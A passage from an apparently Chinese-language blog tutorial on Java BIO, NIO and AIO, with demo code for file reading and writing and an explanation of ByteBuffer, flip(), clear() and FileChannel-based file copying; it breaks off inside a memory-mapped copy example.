模式。这种模式下，我们的工作模式是先来到厨房，开始烧水，并坐在水壶面前一直等着水烧开。<br>NIO （New I&#x2F;O）：同步非阻塞模式。这种模式下，我们的工作模式是先来到厨房，开始烧水，但是我们不一直坐在水壶前面等，而是回到客厅看电视，然后每隔几分钟到厨房看一下水有没有烧开。<br>AIO （Asynchronous I&#x2F;O）：异步非阻塞 I&#x2F;O 模型。这种模式下，我们的工作模式是先来到厨房，开始烧水，我们不一直坐在水壶前面等，也不隔一段时间去看一下，而是在客厅看电视，水壶上面有个开关，水烧开之后他会通知我。</p><p>阻塞 VS 非阻塞：人是否坐在水壶前面一直等。<br>同步 VS 异步：水壶是不是在水烧开之后主动通知人。</p><p>BIO 方式适用于连接数目比较小且固定的架构<br>NIO 方式适用于连接数目多且连接比较短（轻操作）的架构，比如聊天服务器，并发局限于应用中，编程比较复杂<br>AIO 方式适用于连接数目多且连接比较长（重操作）的架构，比如相册服务器，充分调用 OS 参与并发操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BioFileDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">BioFileDemo</span> <span class="variable">demo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BioFileDemo</span>();</span><br><span class="line">        demo.writeFile();</span><br><span class="line">        demo.readFile();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;logs/itdas/dasda.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileWriter</span> <span class="variable">fileWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(filename);</span><br><span class="line">            <span class="type">BufferedWriter</span> <span class="variable">bufferedWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(fileWriter);</span><br><span class="line"></span><br><span class="line">            bufferedWriter.write(<span class="string">&quot;dasdasdasdasd&quot;</span>);</span><br><span class="line">            bufferedWriter.newLine();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;写入完成&quot;</span>);</span><br><span class="line">            bufferedWriter.close();</span><br><span class="line">            fileWriter.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readFile</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;logs/itdas/dasda.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(filename);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(fileReader);</span><br><span class="line"></span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span>((line = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            bufferedReader.close();</span><br><span class="line">            fileReader.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个示例展示了如何使用 Java 中的传统阻塞 I&#x2F;O（BIO）对文件进行读写操作。在 writeFile() 方法中，我们首先创建一个 FileWriter 对象，并使用 BufferedWriter 进行缓冲写入。接着，使用 bufferedWriter.write() 方法将字符串写入文件，然后调用 bufferedWriter.newLine() 方法添加换行符。最后，关闭 BufferedWriter 和 FileWriter。在 readFile() 方法中，我们创建一个 FileReader 对象，并使用 BufferedReader 进行缓冲读取。然后通过调用 bufferedReader.readLine() 方法循环读取文件内容，直到返回 null 表示读取完毕。最后，关闭 BufferedReader 和 FileReader。</p><p>接下来是 NIO 的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NioFileDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">NioFileDemo</span> <span class="variable">demo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioFileDemo</span>();</span><br><span class="line">        demo.writeFile();</span><br><span class="line">        demo.readFile();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 NIO 写入文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs/itwanger/paicoding.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileChannel</span> <span class="variable">fileChannel</span> <span class="operator">=</span> FileChannel.open(path, EnumSet.of(StandardOpenOption.CREATE, StandardOpenOption.WRITE));</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> StandardCharsets.UTF_8.encode(<span class="string">&quot;学编程就上技术派&quot;</span>);</span><br><span class="line">            fileChannel.write(buffer);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;写入完成&quot;</span>);</span><br><span class="line">            fileChannel.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 NIO 读取文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readFile</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs/itwanger/paicoding.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileChannel</span> <span class="variable">fileChannel</span> <span class="operator">=</span> FileChannel.open(path, StandardOpenOption.READ);</span><br><span class="line">            <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> fileChannel.read(buffer);</span><br><span class="line">            <span class="keyword">while</span> (bytesRead != -<span class="number">1</span>) &#123;</span><br><span class="line">                buffer.flip();</span><br><span class="line">                System.out.println(<span class="string">&quot;读取的内容: &quot;</span> + StandardCharsets.UTF_8.decode(buffer));</span><br><span class="line">                buffer.clear();</span><br><span class="line">                bytesRead = fileChannel.read(buffer);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fileChannel.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 AIO 实现文件的读取和写入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AioDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">AioDemo</span> <span class="variable">demo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AioDemo</span>();</span><br><span class="line">        demo.writeFile();</span><br><span class="line">        demo.readFile();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 AsynchronousFileChannel 写入文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 使用 Paths.get() 获取文件路径</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs/itwanger/paicoding.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 用 AsynchronousFileChannel.open() 打开文件通道，指定写入和创建文件的选项。</span></span><br><span class="line">            <span class="type">AsynchronousFileChannel</span> <span class="variable">fileChannel</span> <span class="operator">=</span> AsynchronousFileChannel.open(path, StandardOpenOption.WRITE, StandardOpenOption.CREATE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将要写入的字符串（&quot;学编程就上技术派&quot;）转换为 ByteBuffer。</span></span><br><span class="line">            <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> StandardCharsets.UTF_8.encode(<span class="string">&quot;学编程就上技术派&quot;</span>);</span><br><span class="line">            <span class="comment">// 调用 fileChannel.write() 方法将 ByteBuffer 中的内容写入文件。这是一个异步操作，因此需要使用 Future 对象等待写入操作完成。</span></span><br><span class="line">            Future&lt;Integer&gt; result = fileChannel.write(buffer, <span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 等待写操作完成</span></span><br><span class="line">            result.get();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;写入完成&quot;</span>);</span><br><span class="line">            fileChannel.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException | java.util.concurrent.ExecutionException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 AsynchronousFileChannel 读取文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readFile</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs/itwanger/paicoding.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 指定读取文件的选项。</span></span><br><span class="line">            <span class="type">AsynchronousFileChannel</span> <span class="variable">fileChannel</span> <span class="operator">=</span> AsynchronousFileChannel.open(path, StandardOpenOption.READ);</span><br><span class="line">            <span class="comment">// 创建一个 ByteBuffer，用于存储从文件中读取的数据。</span></span><br><span class="line">            <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用 fileChannel.read() 方法从文件中异步读取数据。该方法接受一个 CompletionHandler 对象，用于处理异步操作完成后的回调。</span></span><br><span class="line">            fileChannel.read(buffer, <span class="number">0</span>, buffer, <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;Integer, ByteBuffer&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(Integer result, ByteBuffer attachment)</span> &#123;</span><br><span class="line">                    <span class="comment">// 在 CompletionHandler 的 completed() 方法中，翻转 ByteBuffer（attachment.flip()），然后使用 Charset.forName(&quot;UTF-8&quot;).decode() 将其解码为字符串并打印。最后，清空缓冲区并关闭文件通道。</span></span><br><span class="line">                    attachment.flip();</span><br><span class="line">                    System.out.println(<span class="string">&quot;读取的内容: &quot;</span> + StandardCharsets.UTF_8.decode(attachment));</span><br><span class="line">                    attachment.clear();</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        fileChannel.close();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, ByteBuffer attachment)</span> &#123;</span><br><span class="line">                    <span class="comment">// 如果异步读取操作失败，CompletionHandler 的 failed() 方法将被调用，打印错误信息。</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;读取失败&quot;</span>);</span><br><span class="line">                    exc.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 等待异步操作完成</span></span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BIO（Blocking I&#x2F;O）：采用阻塞式 I&#x2F;O 模型，线程在执行 I&#x2F;O 操作时被阻塞，无法处理其他任务，适用于连接数较少且稳定的场景。<br>NIO（New I&#x2F;O 或 Non-blocking I&#x2F;O）：使用非阻塞 I&#x2F;O 模型，线程在等待 I&#x2F;O 时可执行其他任务，通过 Selector 监控多个 Channel 上的事件，提高性能和可伸缩性，适用于高并发场景。<br>AIO（Asynchronous I&#x2F;O）：采用异步 I&#x2F;O 模型，线程发起 I&#x2F;O 请求后立即返回，当 I&#x2F;O 操作完成时通过回调函数通知线程，进一步提高了并发处理能力，适用于高吞吐量场景。</p><h2 id="Buffer缓冲区和Channel通道"><a href="#Buffer缓冲区和Channel通道" class="headerlink" title="Buffer缓冲区和Channel通道"></a>Buffer缓冲区和Channel通道</h2><p>在 NIO 中，并不是以流的方式来处理数据的，而是以 buffer 缓冲区和 Channel 通道配合使用来处理数据的。可以把 Channel 通道比作铁路，buffer 缓冲区比作成火车(运载着货物),要时刻记住：Channel 不与数据打交道，它只负责运输数据。与数据打交道的是 Buffer 缓冲区.相对于传统 IO 而言，流是单向的。对于 NIO 而言，有了 Channel 通道这个概念，我们的读写都是双向的。</p><h3 id="Buffer-缓冲区"><a href="#Buffer-缓冲区" class="headerlink" title="Buffer 缓冲区"></a>Buffer 缓冲区</h3><p>Buffer 是缓冲区的抽象类 其中 ByteBuffer 是用得最多的实现类(在通道中读写字节数据)<br><img src="/2024/11/04/code/javanio/image-3.png"><br>Buffer 类维护了 4 个核心变量来提供关于其所包含的数组信息。它们是：</p><ul><li>容量 Capacity 缓冲区能够容纳的数据元素的最大数量。容量在缓冲区创建时被设定，并且永远不能被改变。(不能被改变的原因也很简单，底层是数组嘛)</li><li>上界 Limit 缓冲区里的数据的总数，代表了当前缓冲区中一共有多少数据。</li><li>位置 Position 下一个要被读或写的元素的位置。Position 会自动由相应的 get()和 put()函数更新。</li><li>标记 Mark 一个备忘位置。用于记录上一次读写的位置。</li></ul><p>首先展示一下是如何创建缓冲区的，核心变量的值是怎么变化的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个缓冲区</span></span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">byteBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 看一下初始时4个核心变量的值</span></span><br><span class="line">System.out.println(<span class="string">&quot;初始时--&gt;limit---&gt;&quot;</span>+byteBuffer.limit());</span><br><span class="line">System.out.println(<span class="string">&quot;初始时--&gt;position---&gt;&quot;</span>+byteBuffer.position());</span><br><span class="line">System.out.println(<span class="string">&quot;初始时--&gt;capacity---&gt;&quot;</span>+byteBuffer.capacity());</span><br><span class="line">System.out.println(<span class="string">&quot;初始时--&gt;mark---&gt;&quot;</span> + byteBuffer.mark());</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;--------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加一些数据到缓冲区中</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;沉默王二&quot;</span>;</span><br><span class="line">byteBuffer.put(s.getBytes());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 看一下初始时4个核心变量的值</span></span><br><span class="line">System.out.println(<span class="string">&quot;put完之后--&gt;limit---&gt;&quot;</span>+byteBuffer.limit());</span><br><span class="line">System.out.println(<span class="string">&quot;put完之后--&gt;position---&gt;&quot;</span>+byteBuffer.position());</span><br><span class="line">System.out.println(<span class="string">&quot;put完之后--&gt;capacity---&gt;&quot;</span>+byteBuffer.capacity());</span><br><span class="line">System.out.println(<span class="string">&quot;put完之后--&gt;mark---&gt;&quot;</span> + byteBuffer.mark());</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">初始时--&gt;limit---&gt;1024</span><br><span class="line">初始时--&gt;position---&gt;0</span><br><span class="line">初始时--&gt;capacity---&gt;1024</span><br><span class="line">初始时--&gt;mark---&gt;java.nio.HeapByteBuffer[pos=0 lim=1024 cap=1024]</span><br><span class="line">--------------------------------------</span><br><span class="line">put完之后--&gt;limit---&gt;1024</span><br><span class="line">put完之后--&gt;position---&gt;12</span><br><span class="line">put完之后--&gt;capacity---&gt;1024</span><br><span class="line">put完之后--&gt;mark---&gt;java.nio.HeapByteBuffer[pos=12 lim=1024 cap=1024]</span><br></pre></td></tr></table></figure><p>现在我想要从缓存区拿数据，怎么拿呀？？NIO 给了我们一个flip()方法。这个方法可以改动 position 和 limit 的位置！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flip()方法</span></span><br><span class="line">byteBuffer.flip();</span><br><span class="line">System.out.println(<span class="string">&quot;flip()方法之后--&gt;limit---&gt;&quot;</span>+byteBuffer.limit());</span><br><span class="line">System.out.println(<span class="string">&quot;flip()方法之后--&gt;position---&gt;&quot;</span>+byteBuffer.position());</span><br><span class="line">System.out.println(<span class="string">&quot;flip()方法之后--&gt;capacity---&gt;&quot;</span>+byteBuffer.capacity());</span><br><span class="line">System.out.println(<span class="string">&quot;flip()方法之后--&gt;mark---&gt;&quot;</span> + byteBuffer.mark());</span><br></pre></td></tr></table></figure><p><img src="/2024/11/04/code/javanio/image-4.png"><br>在调用 flip() 之后，limit 变为当前 position 的值（12），position 重置为 0。这意味着你可以从缓冲区的开始位置读取刚刚写入的数据，直到 limit 指定的位置。capacity 保持不变（1024）。当切换成读模式之后，我们就可以读取缓冲区的数据了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个limit()大小的字节数组(因为就只有limit这么多个数据可读)</span></span><br><span class="line"><span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[byteBuffer.limit()];</span><br><span class="line"><span class="comment">// 将读取的数据装进我们的字节数组中</span></span><br><span class="line">byteBuffer.get(bytes);</span><br><span class="line"><span class="comment">// 输出数据</span></span><br><span class="line">System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="number">0</span>, bytes.length));</span><br></pre></td></tr></table></figure><p>随后输出一下核心变量的值看看：<br><img src="/2024/11/04/code/javanio/image-5.png"><br>读完如何还想写数据到缓冲区，那就使用clear() 方法，这个方法会“清空”缓冲区，数据没有真正被清空，只是被遗忘掉了<br><img src="/2024/11/04/code/javanio/image-6.png"></p><h3 id="Channel-通道"><a href="#Channel-通道" class="headerlink" title="Channel 通道"></a>Channel 通道</h3><p>Channel 通道只负责传输数据、不直接操作数据。操作数据都是通过 Buffer 缓冲区来进行操作！通常，通道可以分为两大类：文件通道和套接字通道。<br>FileChannel：用于文件 I&#x2F;O 的通道，支持文件的读、写和追加操作。FileChannel 允许在文件的任意位置进行数据传输，支持文件锁定以及内存映射文件等高级功能。FileChannel 无法设置为非阻塞模式，因此它只适用于阻塞式文件操作。<br>SocketChannel：用于 TCP 套接字 I&#x2F;O 的通道。SocketChannel 支持非阻塞模式，可以与 Selector（下文会讲）一起使用，实现高效的网络通信。SocketChannel 允许连接到远程主机，进行数据传输。<br>与之匹配的有ServerSocketChannel：用于监听 TCP 套接字连接的通道。与 SocketChannel 类似，ServerSocketChannel 也支持非阻塞模式，并可以与 Selector 一起使用。ServerSocketChannel 负责监听新的连接请求，接收到连接请求后，可以创建一个新的 SocketChannel 以处理数据传输。<br>DatagramChannel：用于 UDP 套接字 I&#x2F;O 的通道。DatagramChannel 支持非阻塞模式，可以发送和接收数据报包，适用于无连接的、不可靠的网络通信。</p><h4 id="文件通道-FileChannel"><a href="#文件通道-FileChannel" class="headerlink" title="文件通道 FileChannel"></a>文件通道 FileChannel</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileChannel.open(Paths.get(<span class="string">&quot;docs/配套教程.md&quot;</span>), StandardOpenOption.WRITE);</span><br></pre></td></tr></table></figure><ol><li><p>使用FileChannel 配合 ByteBuffer 缓冲区实现文件复制的功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">FileChannel</span> <span class="variable">sourceChannel</span> <span class="operator">=</span> FileChannel.open(Paths.get(<span class="string">&quot;logs/javabetter/itwanger.txt&quot;</span>), StandardOpenOption.READ);</span><br><span class="line">    <span class="type">FileChannel</span> <span class="variable">destinationChannel</span> <span class="operator">=</span> FileChannel.open(Paths.get(<span class="string">&quot;logs/javabetter/itwanger1.txt&quot;</span>), StandardOpenOption.WRITE, StandardOpenOption.CREATE)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (sourceChannel.read(buffer) != -<span class="number">1</span>) &#123;</span><br><span class="line">      buffer.flip();</span><br><span class="line">      destinationChannel.write(buffer);</span><br><span class="line">      buffer.clear();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取数据后，我们调用 flip() 方法，以便在缓冲区中准备好要写入的数据。然后，我们将缓冲区的内容写入目标文件的 FileChannel（write() 方法）。在写入完成后，我们调用 clear() 方法重置缓冲区，以便在下一次迭代中重用它。</p></li><li><p>使用内存映射文件（MappedByteBuffer）的方式实现文件复制的功能(直接操作缓冲区)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">FileChannel</span> <span class="variable">sourceChannel</span> <span class="operator">=</span> FileChannel.open(Paths.get(<span class="string">&quot;logs/javabetter/itwanger.txt&quot;</span>), StandardOpenOption.READ);</span><br><span class="line">      <span class="type">FileChannel</span> <span class="variable">destinationChannel</span> <span class="operator">=</span> FileChannel.open(Paths.get(<span class="string">&quot;logs/javabetter/itwanger2.txt&quot;</span>), StandardOpenOption.WRITE, StandardOpenOption.CREATE, StandardOpenOption.READ)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="variable">fileSize</span> <span class="operator">=</span> sourceChannel.size();</span><br><span class="line">    <span class="type">MappedByteBuffer</span> <span class="variable">sourceMappedBuffer</span> <span class="operator">=</span> sourceChannel.map(FileChannel.MapMode.READ_ONLY, <span class="number">0</span>, fileSize);</span><br><span class="line">    <span class="type">MappedByteBuffer</span> <span class="variable">destinationMappedBuffer</span> <span class="operator">=</span> destinationChannel.map(FileChannel.MapMode.READ_WRITE, <span class="number">0</span>, fileSize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fileSize; i++) &#123;</span><br><span 